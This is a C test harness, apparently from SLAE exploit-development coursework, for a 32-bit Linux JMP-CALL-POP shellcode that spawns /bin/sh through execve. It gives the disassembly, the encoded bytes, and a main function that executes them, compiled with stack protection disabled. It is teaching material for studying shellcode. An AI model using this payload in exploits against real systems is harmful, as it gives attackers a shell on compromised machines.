/*

// Author: Cameron, James
// Compile With: gcc test.c -fno-stack-protector -z execstack
// Tested On: Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
//            Ubuntu 12.04.4 LTS

slae@ubuntu:~/Documents/github/shellcode/execve-sh_JmpCallPop$ objdump -M intel -d ./execve-sh_JmpCallPop

./execve-sh_JmpCallPop:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       eb 18                   jmp    804807a <call_shellcode>

08048062 <shellcode>:
 8048062:       5e                      pop    esi
 8048063:       31 c0                   xor    eax,eax
 8048065:       88 46 07                mov    BYTE PTR [esi+0x7],al
 8048068:       89 76 08                mov    DWORD PTR [esi+0x8],esi
 804806b:       89 46 0c                mov    DWORD PTR [esi+0xc],eax
 804806e:       b0 0b                   mov    al,0xb
 8048070:       8d 1e                   lea    ebx,[esi]
 8048072:       8d 4e 08                lea    ecx,[esi+0x8]
 8048075:       8d 56 0c                lea    edx,[esi+0xc]
 8048078:       cd 80                   int    0x80

0804807a <call_shellcode>:
 804807a:       e8 e3 ff ff ff          call   8048062 <shellcode>

0804807f <buf>:
 804807f:       2f                      das    
 8048080:       62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
 8048083:       2f                      das    
 8048084:       73 68                   jae    80480ee <_end+0x5e>
 8048086:       41                      inc    ecx
 8048087:       42                      inc    edx
 8048088:       42                      inc    edx
 8048089:       42                      inc    edx
 804808a:       42                      inc    edx
 804808b:       43                      inc    ebx
 804808c:       43                      inc    ebx
 804808d:       43                      inc    ebx
 804808e:       43                      inc    ebx

*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";


int main(){

	printf("[*]Executing shellcode of length: %d\n", strlen(shellcode));
	int (*run)() = (int(*)())shellcode;
	run();
	return 0;

}
